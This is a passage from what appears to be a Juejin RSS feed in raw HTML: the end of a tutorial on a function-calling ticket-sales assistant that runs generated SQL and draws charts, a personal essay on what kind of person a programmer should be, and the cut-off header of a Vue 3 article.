                    <span class="hljs-string">"description"</span>: <span class="hljs-string">"生成的SQL语句"</span>,
                }
            },
            <span class="hljs-string">"required"</span>: [<span class="hljs-string">"sql_input"</span>],
        },
    },
]
</code></pre>
<h4 data-id="heading-16">3、Assistant 初始化与 function_list：把「大脑」和「工具」接上</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_agent_service</span>():
    <span class="hljs-string">"""初始化门票助手服务"""</span>
    llm_cfg = {
        <span class="hljs-string">'model'</span>: <span class="hljs-string">'qwen-turbo-latest'</span>,
        <span class="hljs-string">'timeout'</span>: <span class="hljs-number">30</span>,
        <span class="hljs-string">'retry_count'</span>: <span class="hljs-number">3</span>,
    }
    <span class="hljs-keyword">try</span>:
        bot = Assistant(
            llm=llm_cfg,
            name=<span class="hljs-string">'门票助手'</span>,
            description=<span class="hljs-string">'门票查询与订单分析'</span>,
            system_message=system_prompt,
            function_list=[<span class="hljs-string">'exc_sql'</span>],  <span class="hljs-comment"># 只传工具名字符串</span>
        )
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"助手初始化成功！"</span>)
        <span class="hljs-keyword">return</span> bot
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"助手初始化失败: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)
        <span class="hljs-keyword">raise</span>
</code></pre>
<h4 data-id="heading-17">4、Web 图形界面：给运营一个可直接使用的入口</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">app_gui</span>():
    <span class="hljs-string">"""图形界面模式，提供 Web 图形界面"""</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"正在启动 Web 界面..."</span>)
        <span class="hljs-comment"># 初始化助手</span>
        bot = init_agent_service()
        <span class="hljs-comment"># 配置聊天界面，列举3个典型门票查询问题</span>
        chatbot_config = {
            <span class="hljs-string">'prompt.suggestions'</span>: [
                <span class="hljs-string">'2023年4、5、6月一日门票，二日门票的销量多少？帮我按照周进行统计'</span>,
                <span class="hljs-string">'2023年7月的不同省份的入园人数统计'</span>,
                <span class="hljs-string">'帮我查看2023年10月1-7日销售渠道订单金额排名'</span>,
            ]
        }
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"Web 界面准备就绪，正在启动服务..."</span>)
        <span class="hljs-comment"># 启动 Web 界面</span>
        WebUI(
            bot,
            chatbot_config=chatbot_config
        ).run()
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"启动 Web 界面失败: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"请检查网络连接和 API Key 配置"</span>)
</code></pre>
<blockquote>
<p>总结：至此，function call 相关逻辑全部通过Assistant的function_list机制与工具注册实现。LLM 只负责“提 SQL”exc_sql负责“真查询”前端 WebUI/终端则负责把结果友好地呈现出来同一套逻辑既支持终端（app_tui），也支持 WebUI 两种交互方式。</p>
</blockquote>
<h3 data-id="heading-18">📊 门票助手示例</h3>
<h4 data-id="heading-19">示例一：按周统计销量</h4>
<p><strong>问题</strong>：2023年4、5、6月一日门票，二日门票的销量多少？帮我按照周进行统计</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0b026fc5fab411ab2197271dda6a33b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pif5rWpQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769476101&amp;x-signature=LX3VPBZ20QtTG2LkqnAb9I9Jgt0%3D" alt="img_1.jpg" loading="lazy"/></p>
<h4 data-id="heading-20">示例二：销售渠道订单金额排名</h4>
<p><strong>问题</strong>：帮我查看2023年10月1-7日销售渠道订单金额排名</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0525ec3d558405d8c82deca744f3f5c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pif5rWpQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769476101&amp;x-signature=7PBOq0gk9cpix%2F1uvFlHzGiJUpI%3D" alt="img_2.jpg" loading="lazy"/></p>
<h3 data-id="heading-21">📈 可视化图表：让结果「一眼看懂」</h3>
<p>以上示例通过表格进行展示，实际业务中往往还需要快速对比不同 SKU、不同渠道、不同时间段的趋势，这时就需要把查询结果自动转成图表。</p>
<p>在原有<code>exc_sql</code>函数基础上，增加绘图功能，返回结果包括：<strong>数据表 markdown</strong>以及<strong>可视化的图表 PNG</strong>。</p>
<h4 data-id="heading-22">实现步骤</h4>
<h5 data-id="heading-23">Step 1：SQL 查询获取数据</h5>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 执行SQL查询</span>
df = pd.read_sql(sql_input, engine)
<span class="hljs-comment"># 生成markdown表格</span>
md = df.head(<span class="hljs-number">10</span>).to_markdown(index=<span class="hljs-literal">False</span>)
</code></pre>
<p><strong>提示词增加内容</strong>：</p>
<blockquote>
<p>⚠️重要：每当exc_sql工具返回 markdown 表格和图片时，你必须原样输出工具返回的全部内容（包括图片 markdown），不要只总结表格，也不要省略图片。这样用户才能直接看到表格和图片。</p>
</blockquote>
<h5 data-id="heading-24">Step 2：自动推断图表字段</h5>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 自动推断x/y字段</span>
x_candidates = df.select_dtypes(include=[<span class="hljs-string">'object'</span>]).columns.tolist()
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> x_candidates:
    x_candidates = df.columns.tolist()
x = x_candidates[<span class="hljs-number">0</span>]
y_candidates = df.select_dtypes(include=[<span class="hljs-string">'number'</span>]).columns.tolist()
y_fields = y_candidates
</code></pre>
<p><strong>字段推断逻辑</strong>：</p>
<ul>
<li><strong>x 轴字段</strong>：优先选择第一个字符串类型（object）的列，如日期、分类名称等</li>
<li><strong>y 轴字段</strong>：选择所有数值类型的列，支持多系列数据展示</li>
</ul>
<h5 data-id="heading-25">Step 3：柱状图绘制</h5>
<pre><code class="hljs language-python" lang="python">plt.figure(figsize=(<span class="hljs-number">8</span>, <span class="hljs-number">5</span>))
bar_width = <span class="hljs-number">0.35</span> <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(y_fields) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0.6</span>
x_labels = df[x].astype(<span class="hljs-built_in">str</span>)
x_pos = <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(df))
<span class="hljs-keyword">for</span> idx, y_col <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(y_fields):
    plt.bar([p + idx*bar_width <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> x_pos], df[y_col], width=bar_width, label=y_col)
</code></pre>
<p><strong>绘图逻辑</strong>：</p>
<ul>
<li>创建适当大小的图表</li>
<li>根据 y 轴字段数量调整柱宽</li>
<li>支持多系列数据的并列柱状图</li>
<li>每个 y 轴字段绘制一组柱子</li>
<li>自动错开位置，避免柱子重叠</li>
</ul>
<h5 data-id="heading-26">Step 4：图表样式设置</h5>
<pre><code class="hljs language-python" lang="python">plt.xlabel(x)
plt.ylabel(<span class="hljs-string">','</span>.join(y_fields))
plt.title(<span class="hljs-string">f"<span class="hljs-subst">{<span class="hljs-string">' &amp; '</span>.join(y_fields)}</span> by <span class="hljs-subst">{x}</span>"</span>)
plt.xticks([p + bar_width*(<span class="hljs-built_in">len</span>(y_fields)-<span class="hljs-number">1</span>)/<span class="hljs-number">2</span> <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> x_pos], x_labels, rotation=<span class="hljs-number">45</span>, ha=<span class="hljs-string">'right'</span>)
plt.legend()
plt.tight_layout()
</code></pre>
<p><strong>样式设置</strong>：</p>
<ul>
<li>设置 x 轴、y 轴标签</li>
<li>自动生成图表标题</li>
<li>x 轴标签 45 度倾斜，避免重叠</li>
<li>添加图例，区分多系列数据</li>
<li>调整图表布局，确保所有元素可见</li>
</ul>
<h5 data-id="heading-27">Step 5：图表保存与返回</h5>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 自动创建目录</span>
save_dir = os.path.join(os.path.dirname(__file__), <span class="hljs-string">'image_show'</span>)
os.makedirs(save_dir, exist_ok=<span class="hljs-literal">True</span>)
<span class="hljs-comment"># 生成唯一文件名</span>
filename = <span class="hljs-string">f'bar_<span class="hljs-subst">{<span class="hljs-built_in">int</span>(time.time()*<span class="hljs-number">1000</span>)}</span>.png'</span>
save_path = os.path.join(save_dir, filename)
plt.savefig(save_path)
plt.close()
img_path = os.path.join(<span class="hljs-string">'image_show'</span>, filename)
img_md = <span class="hljs-string">f'![柱状图](<span class="hljs-subst">{img_path}</span>)'</span>
<span class="hljs-keyword">return</span> <span class="hljs-string">f"<span class="hljs-subst">{md}</span>\n\n<span class="hljs-subst">{img_md}</span>
</span></code></pre>
<p><strong>保存与返回逻辑</strong>：</p>
<ul>
<li>自动创建图片保存目录</li>
<li>生成基于时间戳的唯一文件名</li>
<li>保存图片到本地</li>
<li>生成 markdown 格式的图片引用</li>
<li>返回「表格 + 图片」组合结果</li>
</ul>
<blockquote>
<p>⚠️注意：在提示词中需要明确要求——每当exc_sql工具返回 Markdown 表格和图片时，LLM 必须原样输出工具返回的全部内容（包括图片 Markdown），不要只总结表格，也不要省略图片，这样运营同学才能直接看到完整结果。</p>
</blockquote>
<h4 data-id="heading-28">图表示例</h4>
<h5 data-id="heading-29">示例一：按周统计销量（带图表）</h5>
<p><strong>问题</strong>：2023年4、5、6月一日门票，二日门票的销量多少？帮我按照周进行统计</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5df8ab691dc4d448dff6fbe04cde287~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pif5rWpQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769476101&amp;x-signature=jmO8IIU7h8BCvTfHZ%2FonxlPIQ9Q%3D" alt="img_3.jpg" loading="lazy"/></p>
<h5 data-id="heading-30">示例二：销售渠道订单金额排名（带图表）</h5>
<p><strong>问题</strong>：帮我查看2023年10月1-7日销售渠道订单金额排名</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3db1451b7473419a9fe2686a1a7b67c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pif5rWpQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769476101&amp;x-signature=rFaYPgga0F1V4HjGxq9OtG4%2BJSU%3D" alt="img_4.jpg" loading="lazy"/></p>
<h3 data-id="heading-31">🔐 进阶与安全实践</h3>
<p>在真实业务环境中，还可以在此基础上做一些进阶优化：</p>

























<table><thead><tr><th>优化项</th><th>说明</th></tr></thead><tbody><tr><td>SQL 安全与只读控制</td><td>限制只允许SELECT语句、自动追加LIMIT，防止误删误改或一次性拉取海量数据</td></tr><tr><td>错误兜底与重试</td><td>当 SQL 语法错误或执行失败时，向用户返回清晰的错误信息，并允许模型基于错误信息自动重写 SQL 再试</td></tr><tr><td>多轮对话与上下文记忆</td><td>支持用户先问「查一下 4–6 月一日票销量」，再追问「那按渠道拆一下」，模型可自动继承时间范围等上下文</td></tr><tr><td>业务口径统一</td><td>把「一日票」「二日票」等业务口径、SKU 归并规则统一写在 system prompt 或配置文件中，避免同一指标不同口径</td></tr></tbody></table>
<blockquote>
<p>💡总结：通过这些实践，function calling 不仅能在 demo 中跑通，也能更稳健地落地到生产业务中。</p>
</blockquote>
<p>**🎉 恭喜！**你已经掌握了如何用 Function Calling 构建一个「会查数据库还会画图」的智能助手。
现在，让数据自己说话吧！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[程序员应该成为一个什么样的人]]></title>    <link>https://juejin.cn/post/7596975035438448649</link>    <guid>https://juejin.cn/post/7596975035438448649</guid>    <pubDate>2026-01-20T03:20:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596975035438448649" data-draft-id="7596990822127108134" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="程序员应该成为一个什么样的人"/> <meta itemprop="keywords" content="前端,后端,程序员"/> <meta itemprop="datePublished" content="2026-01-20T03:20:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端之虎陈随易"/> <meta itemprop="url" content="https://juejin.cn/user/1239904846873326"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            程序员应该成为一个什么样的人
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1239904846873326/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端之虎陈随易
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T03:20:32.000Z" title="Tue Jan 20 2026 03:20:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>这两天，被<code>麻园诗人</code>圈粉了，歌曲<code>泸沽湖</code>循环再听。</p>
<p>上一首循环听的歌曲，应该是<code>福禄寿</code>的<code>我用什么把你留住</code>。</p>
<p>事不过三，再往前推一个，那就是电视剧<code>凡人歌</code>的伴奏<code>椿乐队</code>的<code>野草</code>。</p>
<p>这些歌都有一个共同的特点，或者说，我听的歌，都有一个共同的特点：<code>忧伤中带着向上的力量</code>。</p>
<p>人生百年，蜉蝣一日，对于未来，我一直是持悲观态度的，因为我认为，人，生来就是受苦的。</p>
<p>不说所有人，大部分人都有着无忧无虑的童年，迷茫的青年，焦虑的中年，至于老年怎么样，我现在还无法感同身受。</p>
<p>人到中年，以成功为目标来说，这是最后一次拼一把的机会。</p>
<p>不管是否下有小，还是上有老，一旦在中年结束之前无法有所突破，那么往后的每一步都会走得尤其艰难。</p>
<p>我经常感到庆幸的是，我此时已经在追求自己目标的道路上，前进了很长的一段距离了，而我才刚刚踏入中年的门槛。</p>
<p>作为一个在折腾路上持续不断地折腾了近10年的老码农，同时也最为一个技术圈有一点小人气的小博主，我时不时地就想分享一些关于自己对于人生，对于未来的思考和建议，希望可以给关注我的小伙伴们提供一些关于人生方向和抉择判断的参考。</p>
<p>回到文章开头提到的三首歌，三个乐队，三种力量中来，这篇文章我想分享的就是，<code>程序员应该成为一个什么样的人</code>。</p>
<p>正所谓，干一行，爱一行，我十分热爱编程，甚至是痴迷的程度，刚入行的前几年，研究代码当饭吃，不管是吃饭、坐公交还是上厕所，必然会用手机打开技术相关的书籍学习研究。</p>
<p>所以我的第一个建议就是，<code>专业</code>。</p>
<p>不要把写代码仅仅只是作为一个赚钱的手段，最好是练成一个赚钱的手艺，当然门槛其实也不用太高，能够一人之力解决项目中遇到的绝大部分问题就行。</p>
<p>但我从业10年以来，真正说遇到的程序员中，解决问题手到擒来的真没几个，很多都不具备熟练且顺畅地解决问题的能力，要练。</p>
<p>第二个建议，<code>责任</code>。</p>
<p>说实话，程序员是最容易摸鱼的群体，我估计没有之一。</p>
<p>本身就对电脑操作了如指掌，又是坐办公室，又是高薪，每天的工作就是对着电脑，偷摸地聊聊天，刷刷网页，看看帖子，基本都可以做到神不知，鬼不觉。</p>
<p>鱼可以摸，我们每个月拿高薪的同时，工作一定要做好，代码一定要写好。</p>
<p>为什么说这个话呢，对代码不负责的程序员可太多了，有多少后端程序员的接口是不做字段类型，大小，长短等规则验证的？有多少前端程序员代码不复用封装，页面乱如麻的。</p>
<p>做一个有责任，负责任的人，不用把公司当家，但可以服从公司的合理安排，为公司的发展壮大做贡献的人。</p>
<p>但不知道从什么时候起，网上关于<code>员工</code>和<code>公司</code>、<code>老板</code>的对立关系越来越多。</p>
<p>首先，遇到不良公司，不良老板，咱们肯定是不能再把公司当<code>家</code>的，公事公办，每个月给我碎银几两，我给你解决等同程度的问题。</p>
<p>我写了10年代码，职场待了5年，跳槽了近10次，全部都是中小公司，公司人数最多的一次也不过是接近100人，从来没有超过。</p>
<p>如果要让我对职场遇到的老板们一个评价，只有三个字：<code>不容易</code>，是的，很多开公司，当老板的，真的不容易，很不容易。</p>
<p>曾经年轻气盛，离职的时候老板挽留甚至下跪的。</p>
<p>与老板，同事，甲方聚餐我把两盘龙虾吃完了，老板还在低声下气给甲方赔罪喝酒喝到吐的，当然，不是因为我把桌子上两盘龙虾都吃了的原因，毕竟我还留了一只给我们公司的女同事。</p>
<p>而是项目延期，公司老板在甲方面前，真的特别卑微，但落到我们这些普通员工身份，一点多余的压力都没感受到，只有吃大餐的兴奋和喜悦。</p>
<p>也有公司工资发不出，老板找员工借钱的，或者自己借网贷的，其实每天压力山大，但却并没有表现得特别明显的，反而还要照顾我们这些牛马的情绪和状态。</p>
<p>这里，我给的第三个建议是，<code>理解</code>，理解老板，理解他们的不容易，但不要理解黑心老板。</p>
<p>创业是一个风险特别大的事情，我们牛马的代价，最多就是没有工作，欠一点工资，但老板创业很可能是赌上身家性命的。</p>
<p>问题是，既然代价这么大，那为什么又要去创业呢？其实很多时候，事情并不是只有两种状态，两种结果，人是思想和感情都很复杂的动物，想得越多，束缚越重。</p>
<p>第四个建议呢，<code>折腾</code>，为我们自己考虑，为未来考虑。</p>
<p>为什么要折腾？有很多人都问过我，你这么折腾，折腾这么多年，到底是为了什么？好像做出了一些成绩，但又不多，我很佩服你，但只能半服。</p>
<p>我只能说，折腾是<code>必要</code>的，也是<code>值得</code>的。</p>
<p>2020年下半年我回到农村以来，最开始只有接单这一条路，三年时间，平均月收入从2000到15000，三年后，放弃9成以上的接单业务，主做自媒体和独立开发，收入又断崖式下跌，仿佛回到了解放前，但我开心无比。</p>
<p>从24年开始，我把主要的时间和精力，放到自媒体，独立开发方向，我每天写文章，发视频，做产品，玩开源，不亦乐乎。</p>
<p>这事要放到刚回村那一年，我恐怕早就已经西北风了，哪像现在这样，写文章有钱赚，接推广有钱赚，做产品有钱赚，维护微信社群也有钱赚，虽然都不多，但平均下来，每个月的开销完全足够了。</p>
<p>人生最大的意义是什么？我认为人生最大的意义就是自由。</p>
<p>身体自由，想去哪去哪。思想自由，想干嘛干嘛。我可以睡到自然醒，也可以困了随时睡。劲头来了，我可以连续写半年的开源项目，提交代码3000次。也可以在沉迷做产品的时候，一不小心干了个通宵，不用担心第二天要打卡上班。</p>
<p>但自由是有代价的，我是吃过苦过来的，压力最大的时候真的觉得人生没有意义了，如果贸然离职，压力会大到你无法想象的。</p>
<p>所以，好好上班，在上班有稳定收入的前提下，再不断地去探索额外的收入和事业，为未来谋出路。</p>
<p>最后一个建议，<code>心态</code>，良好的心态是一个非常非常非常重要的能力。</p>
<p>很多事情不是<code>一蹴而就</code>的，而是<code>水到渠成</code>的，不要过于着急，很有可能急不来。</p>
<p>按照自己的节奏和计划，稳步前进，慢就是快，太快反而容易翻跟头。</p>
<p>其实还有很多建议，但没必要全部写出来，不完美的东西，才是最美的，人生本就是一个充满了遗憾的旅程，你看见了这边的风景，那必然会错过另一边的惊喜。</p>
<p>接受不完美，接受不完美的文章，接受不完美的世界，接受不完美的自己，接受不完美的公司，接受不完美的老板，接受不完美的伴侣，接受不富裕的父母，接受平凡而普通的下一代。</p>
<p>点个关注，结个善缘。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🚀 Vue 3 核心概念：Composable 还是 Pinia Store？]]></title>    <link>https://juejin.cn/post/7597009443084304399</link>    <guid>https://juejin.cn/post/7597009443084304399</guid>    <pubDate>2026-01-20T03:26:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597009443084304399" data-draft-id="7597009443084288015" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🚀 Vue 3 核心概念：Composable 还是 Pinia Store？"/> <meta itemprop="keywords" content="前端,Vue.js"/> <meta itemprop="datePublished" content="2026-01-20T03:26:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="unknown331"/> <meta itemprop="url" content="https://juejin.cn/user/2826172528344323"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🚀 Vue 3 核心概念：Composable 还是 Pinia Store？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2826172528344323/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    unknown331
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T03:26:20.000Z" title="Tue Jan 20 2026 03:26:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
